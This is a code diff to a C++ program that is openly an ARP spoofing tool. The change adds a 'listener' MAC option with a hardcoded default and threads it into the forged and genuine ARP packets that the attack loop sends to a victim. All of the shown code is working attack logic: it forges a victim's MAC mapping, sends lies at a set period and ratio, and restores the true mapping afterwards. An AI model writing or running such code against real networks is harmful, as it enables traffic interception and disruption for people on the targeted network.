@@ -33,12 +33,15 @@ int main(int argc, char* argv[])
     toolkit::Args args(argc, argv);
     args.positional("ip", po::value<std::string>()->default_value(""), "ipv4 address", 1);
     args.optional("attack,a", po::value<std::string>()->default_value(""), "arp attack mac");
+    args.optional("listener,l", po::value<std::string>()->default_value("d8:bb:c1:df:b9:d0"),
+                  "listener mac");
     args.optional("per,p", po::value<int>()->default_value(500), "send period (ms)");
     args.optional("ratio,r", po::value<float>()->default_value(100), "attack ratio (%)");
     CHECK_ERR_RTI(args.parse());
 
     auto opt_ip = args.get<std::string>("ip");
     auto opt_attack_mac = args.get<std::string>("attack");
+    auto opt_listener_mac = args.get<std::string>("listener");
     auto opt_per = args.get<int>("per");
     auto opt_ratio = args.get<float>("ratio");
 
@@ -71,7 +74,9 @@ int main(int argc, char* argv[])
         net::Ip4 victim_ip;
         net::Mac victim_actual_mac(opt_attack_mac, true);
         net::Mac victim_forged_mac = forgeMacAddr(victim_actual_mac);
+        net::Mac listener_mac(opt_listener_mac, true);
         ILOG("forging victim {} to be {}", victim_actual_mac, victim_forged_mac);
+        ILOG("listener is at {}", listener_mac);
         ILOG("send period is {}ms, attack ratio {:.3f}%", opt_per, opt_ratio);
         while (!end_attack) {
             if (rarp_cnt == 0) {
@@ -81,9 +86,9 @@ int main(int argc, char* argv[])
                         victim_ip = victim_new_ip;
                         ILOG("victim {} is at {}", victim_actual_mac, victim_ip);
                         lie = net::Packet::arp(victim_forged_mac, victim_ip, victim_forged_mac,
-                                               victim_ip, true);
+                                               victim_ip, true, false, listener_mac);
                         truth = net::Packet::arp(victim_actual_mac, victim_ip, victim_actual_mac,
-                                                 victim_ip, true);
+                                                 victim_ip, true, false, listener_mac);
                     } else {
                         DLOG("victim {} is still at {}", victim_actual_mac, victim_ip);
                     }
@@ -102,8 +107,8 @@ int main(int argc, char* argv[])
         }
         ILOG("attack stopped");
         if (net::Transport::mac2ip(victim_actual_mac, victim_ip) == MyErrCode::kOk) {
-            truth =
-                net::Packet::arp(victim_actual_mac, victim_ip, victim_actual_mac, victim_ip, true);
+            truth = net::Packet::arp(victim_actual_mac, victim_ip, victim_actual_mac, victim_ip,
+                                     true, false, listener_mac);
             for (int i = 0; i < 5; ++i) {
                 CHECK_ERR_RTI(net::Transport::send(handle, truth));
                 std::this_thread::sleep_for(std::chrono::milliseconds(100));
